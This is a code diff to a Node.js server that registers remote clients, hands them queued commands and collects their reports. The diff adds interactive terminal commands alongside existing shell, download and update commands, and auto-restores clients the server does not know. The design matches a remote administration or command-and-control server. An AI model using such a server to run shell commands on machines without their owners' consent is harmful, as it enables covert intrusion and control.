@@ -229,7 +229,9 @@ function isSupportedCommand(command) {
     command === "restart" ||
     command.startsWith("shell:") ||
     command.startsWith("download:") ||
-    command.startsWith("update:")
+    command.startsWith("update:") ||
+    command.startsWith("terminal_exec:") ||
+    command.startsWith("terminal_close:")
   );
 }
 
@@ -253,6 +255,25 @@ function ensureClientDefaults(client) {
     archived: Boolean(client.archived),
     system_info: normalizeSystemInfo(client.system_info) || {}
   };
+}
+
+function upsertClient(storage, clientId, updates = {}) {
+  const now = new Date().toISOString();
+  const existing = ensureClientDefaults(storage.clients[clientId] || {
+    client_id: clientId
+  });
+
+  storage.clients[clientId] = {
+    client_id: clientId,
+    name: existing.name || "",
+    archived: Boolean(existing.archived),
+    registered_at: existing.registered_at || now,
+    last_seen_at: updates.last_seen_at || now,
+    system_info: normalizeSystemInfo(updates.system_info) || existing.system_info || {}
+  };
+
+  storage.commands[clientId] = storage.commands[clientId] || [];
+  return storage.clients[clientId];
 }
 
 function queueCommandForClient(storage, clientId, command, metadata = {}) {
@@ -356,18 +377,10 @@ app.get("/dashboard", (_req, res) => {
 
 app.post("/register", clientAuthMiddleware, requireClientId, (req, res) => {
   const storage = readStorage();
-  const now = new Date().toISOString();
-  const existing = storage.clients[req.clientId] || {};
-
-  storage.clients[req.clientId] = {
-    client_id: req.clientId,
-    name: existing.name || "",
-    archived: Boolean(existing.archived),
-    registered_at: existing.registered_at || now,
-    last_seen_at: now,
-    system_info: normalizeSystemInfo(req.body?.system_info) || existing.system_info || {}
-  };
-  storage.commands[req.clientId] = storage.commands[req.clientId] || [];
+  upsertClient(storage, req.clientId, {
+    last_seen_at: new Date().toISOString(),
+    system_info: req.body?.system_info
+  });
   writeStorage(storage);
 
   logAction("client_registered", { client_id: req.clientId });
@@ -376,11 +389,16 @@ app.post("/register", clientAuthMiddleware, requireClientId, (req, res) => {
 
 app.get("/get-command", clientAuthMiddleware, requireClientId, (req, res) => {
   const storage = readStorage();
-  const client = storage.clients[req.clientId];
+  let client = storage.clients[req.clientId];
 
   if (!client) {
-    logAction("command_request_for_unknown_client", { client_id: req.clientId });
-    return res.status(404).json({ error: "Client is not registered" });
+    client = upsertClient(storage, req.clientId, {
+      last_seen_at: new Date().toISOString()
+    });
+    logAction("client_auto_restored", {
+      client_id: req.clientId,
+      source: "get-command"
+    });
   }
 
   client.last_seen_at = new Date().toISOString();
@@ -408,11 +426,16 @@ app.get("/get-command", clientAuthMiddleware, requireClientId, (req, res) => {
 
 app.post("/report", clientAuthMiddleware, requireClientId, requireTextField("result", 10000), (req, res) => {
   const storage = readStorage();
-  const client = storage.clients[req.clientId];
+  let client = storage.clients[req.clientId];
 
   if (!client) {
-    logAction("report_for_unknown_client", { client_id: req.clientId });
-    return res.status(404).json({ error: "Client is not registered" });
+    client = upsertClient(storage, req.clientId, {
+      last_seen_at: new Date().toISOString()
+    });
+    logAction("client_auto_restored", {
+      client_id: req.clientId,
+      source: "report"
+    });
   }
 
   client.last_seen_at = new Date().toISOString();
@@ -463,7 +486,7 @@ app.post(
         command_preview: req.command.slice(0, 120)
       });
       return res.status(400).json({
-        error: "Unsupported command format. Use shell:, download:, or update:"
+        error: "Unsupported command format. Use shell:, download:, update:, terminal_exec:, or terminal_close:"
       });
     }
 
